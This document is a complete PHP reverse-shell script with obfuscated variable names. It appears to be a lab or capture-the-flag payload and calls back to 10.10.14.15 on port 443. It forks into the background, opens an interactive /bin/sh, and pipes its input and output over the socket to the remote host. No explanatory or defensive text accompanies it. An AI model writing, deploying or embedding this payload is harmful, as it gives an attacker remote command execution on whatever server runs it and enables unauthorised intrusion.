<?php set_time_limit(0);$y0="1.0";$r1='10.10.14.15';$d2=443;$o3=1400;$h4=null;$l5=null;$z6='uname -a; w; id; /bin/sh -i';$s7=0;$y8=0;if(function_exists('pcntl_fork')){$t9=pcntl_fork();if($t9==-1){printit("ERROR: Can't fork");exit(1);}if($t9){exit(0);}if(posix_setsid()==-1){printit("Error: Can't setsid()");exit(1);}$s7=1;}else{printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");}chdir("/");umask(0);$g10=fsockopen($r1,$d2,$r11,$v12,30);if(!$g10){printit("$v12 ($r11)");exit(1);}$l13=array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","w"));$o14=proc_open($z6,$l13,$j15);if(!is_resource($o14)){printit("ERROR: Can't spawn shell");exit(1);}stream_set_blocking($j15[0],0);stream_set_blocking($j15[1],0);stream_set_blocking($j15[2],0);stream_set_blocking($g10,0);printit("Successfully opened reverse shell to $r1:$d2");while(1){if(feof($g10)){printit("ERROR: Shell connection terminated");break;}if(feof($j15[1])){printit("ERROR: Shell process terminated");break;}$l16=array($g10,$j15[1],$j15[2]);$e17=stream_select($l16,$h4,$l5,null);if(in_array($g10,$l16)){if($y8)printit("SOCK READ");$x18=fread($g10,$o3);if($y8)printit("SOCK: $x18");fwrite($j15[0],$x18);}if(in_array($j15[1],$l16)){if($y8)printit("STDOUT READ");$x18=fread($j15[1],$o3);if($y8)printit("STDOUT: $x18");fwrite($g10,$x18);}if(in_array($j15[2],$l16)){if($y8)printit("STDERR READ");$x18=fread($j15[2],$o3);if($y8)printit("STDERR: $x18");fwrite($g10,$x18);}}fclose($g10);fclose($j15[0]);fclose($j15[1]);fclose($j15[2]);proc_close($o14);function printit($q19){if(!$s7){print"$q19\n";}}?>
